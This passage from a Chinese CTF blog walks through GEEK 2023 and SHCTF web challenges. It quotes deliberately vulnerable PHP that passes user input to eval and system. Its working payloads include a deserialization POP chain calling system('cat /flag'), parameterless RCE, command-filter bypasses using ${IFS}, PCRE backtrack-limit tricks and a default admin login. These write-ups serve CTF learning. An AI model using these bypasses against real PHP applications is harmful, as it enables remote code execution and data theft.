(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;再绕最后一步吧&quot;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好哩，快拿到flag啦&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这里绕不过去，QW可不答应了哈&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嘿嘿嘿，你别急啊&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>首先是第一个if</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(isset($_GET[<span class="hljs-string">&#x27;syc&#x27;</span>])</span></span>&amp;&amp;<span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;syc&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;syc&#x27;</span>]</span> !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>^表示匹配开头$表示匹配到结尾<br>我先想到的是替换空格,在本地环境测试中一直也没通过<br>preg_match也有绕过的方式<br>在字符串后加入%0a返回的也为true<br>同时后面比较为强比较不能与%0a匹配<br>所以payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">syc</span>=Welcome <span class="hljs-keyword">to</span> GEEK 2023!%0a<br></code></pre></td></tr></table></figure><p>第二个if</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">intval</span>($_GET[&#x27;lover&#x27;]) &lt; <span class="hljs-number">2023</span> <span class="hljs-symbol">&amp;&amp;</span> intval($_GET[&#x27;lover&#x27;] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>)<br></code></pre></td></tr></table></figure><p>intval有一个小漏洞<br>intval(‘2e4’)为2而intval(‘2e4’+1)为20001<br>payload</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">lover</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>e4<br></code></pre></td></tr></table></figure><p>第三、四个if</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">isset</span>($_POST[&#x27;qw&#x27;]) <span class="hljs-symbol">&amp;&amp;</span> $_POST[&#x27;yxx&#x27;])<br>if (<span class="hljs-name">sha1</span>($array1) === sha1($array2))<br></code></pre></td></tr></table></figure><p>本来以为要强碰撞绕过，但出题人好像有点疏忽了,让两个post相等即可<br>直接payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qw</span>=<span class="hljs-number">1</span>&amp;yxx=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>最后一个if</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">isset</span>($_POST[&#x27;SYC_GEEK.<span class="hljs-number">2023</span>&#x27;])<span class="hljs-symbol">&amp;&amp;</span>($_POST[&#x27;SYC_GEEK.<span class="hljs-number">2023</span>&#x27;]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>))<br></code></pre></td></tr></table></figure><p>把第一个下划线改为<code>[</code>即可(使后面的特殊字符不被转义)<br>payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">SYC[GEEK.<span class="hljs-attribute">2023</span>=Happy <span class="hljs-keyword">to</span> see you!<br></code></pre></td></tr></table></figure><h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><p>反序列化题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li><p>__construct()：实例化对象时，首先会去自动执行的一个方法</p></li><li><p>__invoke()：格式表达错误导致没魔术方法触发（把对象当成函数调用）</p></li><li><p>__get()：调用的成员属性是私有属性或不存在时触发（返回值：不存在的成员属性的名称）</p></li></ul><p>构造出这几行代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new web();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">eva1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">interesting</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;<br><span class="hljs-variable">$b</span>=new lover();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">yxx</span>=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">QW</span>=<span class="hljs-string">&#x27;asd&#x27;</span>;//赋一未知值来调用__get<br><span class="hljs-variable">$c</span>=new syc();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">cuit</span>=<span class="hljs-variable">$b</span>;//触发__invoke<br><br>echo serialize(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;yxx&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;eva1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;interesting&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;QW&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(flag.php);<br><span class="hljs-comment">//当前目录下有好康的😋</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$var</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>];<br>   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/env|var|session|header/i&quot;</span>, <span class="hljs-variable">$var</span>,<span class="hljs-variable">$match</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$var</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;WAF!!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PLZ DONT HCAK ME😅&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$var</span>))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>[ \f\n\r\t\v]。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs \s：```匹配任何空白字符，包括空格、制表符、换页符等等。等价于">```+?：```对于字符串 &quot;oooo&quot;，&#x27;o+?&#x27; 将匹配单个 &quot;o&quot;，而 &#x27;o+&#x27; 将匹配所有 &#x27;o&#x27;<br>```(?R)?：```(?R)代表当前表达式，就是```/[^\s\(\)]+?\((?R)?\)/```，所以会一直递归,?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d())))<br>而(?R)?能匹配的只有a(b()); a(b(c()));这种类型的，比如传入a(b(c()));,第一次匹配后，就剩a(b()),第二次匹配后,a();,第三次匹配后就剩下;了，最后a(b(c()))就会被eval执行。<br><br>思路明确了，这题应该使用无参RCE<br>下面是无参RCE的常用函数<br></code></pre></td></tr></table></figure><p>getchwd()：函数返回当前工作目录。<br>scandir()：函数返回指定目录中的文件和目录的数组。<br>dirname()：函数返回路径中的目录部分。<br>chdir()：函数改变当前的目录。<br>readfile()：输出一个文件。<br>current()：返回数组中的当前单元, 默认取第一个值。<br>pos()：current() 的别名。<br>next()：函数将内部指针指向数组中的下一个元素，并输出。<br>end()：将内部指针指向数组中的最后一个元素，并输出。<br>array_rand()：函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br>array_flip()：array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。<br>array_slice()：函数在数组中根据条件取出一段值，并返回。<br>array_reverse()：函数返回翻转顺序的数组。<br>chr() 函数从指定的：ASCII 值返回字符。<br>hex2bin()：— 转换十六进制字符串为二进制字符串。<br>getenv()：获取一个环境变量的值(在7.1之后可以不给予参数)。<br>localeconv()：函数返回一包含本地数字及货币格式信息的数组。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><br><span class="hljs-symbol">payload:</span><br></code></pre></td></tr></table></figure><p>?var&#x3D;print_r(scandir(pos(localeconv())));<br>&#x2F;&#x2F;Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; error.log [3] &#x3D;&gt; <a href="mailto:&#x66;&#108;&#x40;&#x67;&#46;&#x70;&#x68;&#x70;">&#x66;&#108;&#x40;&#x67;&#46;&#x70;&#x68;&#x70;</a> [4] &#x3D;&gt; genshin01.txt [5] &#x3D;&gt; index.php [6] &#x3D;&gt; tiangou01.txt [7] &#x3D;&gt; tiangou02.txt )</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>可以看出flag在一个特殊的位置上，无法通过next或end直接读取，那么我们使用随机函数<br>可以用```array_rand()```和```array_flip()```<br>(```array_rand()```返回的是键名所以必须搭配```array_flip()```来交换键名、键值来获得键值，随机刷新显示的内容)<br><br><span class="hljs-title">payload:</span><br></code></pre></td></tr></table></figure><p>?var&#x3D;show_source(array_rand(array_flip(scandir(pos(localeconv())))));</p><pre><code class="hljs">多刷新几遍就出来了</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shctf</title>
    <link href="/2023/10/26/shctf/"/>
    <url>/2023/10/26/shctf/</url>
    
    <content type="html"><![CDATA[<h2 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>简单的绕过<br>空格被过滤使用${IFS}不能使用%20或%09，因为这里面包含数字和%<br>cat 和flag关键字被过滤可以在字符中间插入<code>&#39;&#39;</code>或<code>\</code>，这题同样过滤了<code>&#39;&#39;</code>，使用\即可<br>payload:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">?rce=<span class="hljs-keyword">ls</span><br><span class="hljs-comment">//flag.php index.php</span><br>?rce=<span class="hljs-keyword">ca</span>\t<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-keyword">fl</span>\ag.php<br></code></pre></td></tr></table></figure><p>返回一个php代码(感觉并没有什么用。。。)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>==<span class="hljs-string">&quot;not_flag&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$flag</span>==<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;dzctf&#123;test_flag&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?rce=<span class="hljs-keyword">ls</span>$&#123;IFS&#125;/<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?rce=cat$&#123;IFS&#125;/flag<br>//flag&#123;4289e79a-<span class="hljs-number">8b35</span>-<span class="hljs-number">4b79</span>-<span class="hljs-number">8128</span>-40f4777d31b2&#125;<br></code></pre></td></tr></table></figure><h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;./index.txt&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c_ode&#x27;</span>];<br>    <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))<br>    &#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="hljs-variable">$code</span>))<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no touch!&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&#x27;2023SHCTF&#x27;</span>) === <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what do you want&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>num数组绕过即可<br>重点在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="hljs-variable">$code</span>))<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no touch!&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&#x27;2023SHCTF&#x27;</span>) === <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what do you want&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>&#x2F;is：大小写与空格换行同过滤<br>这里不能用数组绕过<br>因为：<br>虽然能绕过第一个preg_match()<br>虽说null&#x3D;&#x3D;&#x3D;false返回的是false是可以绕过的<br>但在实际测试中还是没有绕过，究其原因是<code>$code = (String)$_POST[&#39;c_ode&#39;];</code>的问题，在本地php环境测试一下<br>如果除去(string)那么是可以绕过stripos()输出flag<br>这里使用var_dump()显示code的值<br><img src="/images/TK6POUBOSXRE.png"><br>加上(string)<br><img src="/images/G5KY8TSRG0JPV1NTDH.png"><br>可以看出问题所在，string把数组ARRAY强转化<br>Array!&#x3D;&#x3D;2023SHCTF,所以没有绕过<br>所以不能用数组<br>%20和%0a也不行，因为&#x2F;is过滤了换行与空格<br>那么只有使用PCRE回溯次数限制<br>写一个简单的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1000000</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>在最后加入2023SHCTF得到flag</p><h2 id="WEEK1-登录就给flag"><a href="#WEEK1-登录就给flag" class="headerlink" title="[WEEK1]登录就给flag"></a>[WEEK1]登录就给flag</h2><p>双鸡表框会有历史记录，试出来最后的答案是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username:<span class="hljs-keyword">admin</span><br><span class="hljs-keyword">password</span>:<span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure><h2 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2><p>js文件打开，看到有个Unicode加密格式</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-character">\u005a</span><span class="hljs-character">\u006d</span><span class="hljs-character">\u0078</span><span class="hljs-character">\u0068</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u0073</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u004d</span><span class="hljs-character">\u0032</span><span class="hljs-character">\u0056</span><span class="hljs-character">\u006a</span><span class="hljs-character">\u0059</span><span class="hljs-character">\u007a</span><span class="hljs-character">\u006b</span><span class="hljs-character">\u0030</span><span class="hljs-character">\u0059</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u0030</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u005a</span><span class="hljs-character">\u0057</span><span class="hljs-character">\u0052</span><span class="hljs-character">\u0069</span><span class="hljs-character">\u004c</span><span class="hljs-character">\u0054</span><span class="hljs-character">\u0051</span><span class="hljs-character">\u0078</span><span class="hljs-character">\u004e</span><span class="hljs-character">\u006a</span><span class="hljs-character">\u0049</span><span class="hljs-character">\u0074</span><span class="hljs-character">\u004f</span><span class="hljs-character">\u0044</span><span class="hljs-character">\u0051</span><span class="hljs-character">\u0033</span><span class="hljs-character">\u004f</span><span 